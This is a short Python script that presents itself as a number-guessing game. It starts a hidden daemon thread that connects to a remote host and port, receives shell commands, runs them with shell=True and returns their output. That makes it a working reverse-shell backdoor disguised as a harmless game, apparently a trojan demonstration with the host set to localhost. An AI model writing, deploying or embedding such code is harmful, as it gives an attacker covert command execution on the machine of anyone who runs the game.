import socket
import subprocess
from threading import Thread
import random

#if server is up - initialize connection
def smuggling():
    REMOTE_HOST = '127.0.0.1'
    REMOTE_PORT = 8081
    client = socket.socket()
    while True:
        try:
            client.connect((REMOTE_HOST, REMOTE_PORT))
            break
        except:
            continue
    while True:
        #server interaction
        command = client.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)

#game of number guessing
def game():
    score = 0
    while True:
        number = random.randint(1,100)
        score+=20
        guess = 0
        print('Hi! I thought of a number between 1 and 100. Type in your guess!')
        print('Quicker your guess - more point you get!')
        while number!=int(guess):
            guess = input("Please enter your guess:\n")
            try:
                g = int(guess)
            except ValueError:
                exit(0)
            if (g>number):
                print('I would try something a bit smaller if I were you :)')
                score-=1
            if (g<number):
                print('Next time strive for the stars!')
                score-=1
        print('You guessed it! Congrats! Your total score is',score)


thread_console = Thread(target=smuggling, daemon=True)
thread_console.start()
thread_game = Thread(target=game)
thread_game.start()

    